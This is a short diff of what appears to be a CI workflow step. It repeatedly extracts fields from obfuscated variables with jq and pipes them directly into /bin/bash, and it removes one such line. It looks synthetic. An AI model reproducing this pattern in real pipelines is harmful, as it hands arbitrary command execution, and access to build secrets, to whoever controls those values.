@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$pj45191" | jq -r .aswdv27069 | /bin/bash
           printf '%s' "$seu01" | jq -r .catfm5090 | /bin/bash
-          printf '%s' "$hvdrn91" | jq -r .ozp98 | /bin/bash
           echo $kim273 | jq -r .utrcw83081 | /bin/bash
           printf '%s' "$uw043" | jq -r .n9 | /bin/bash
           echo $ddjt363 | jq -r .p47 | /bin/bash
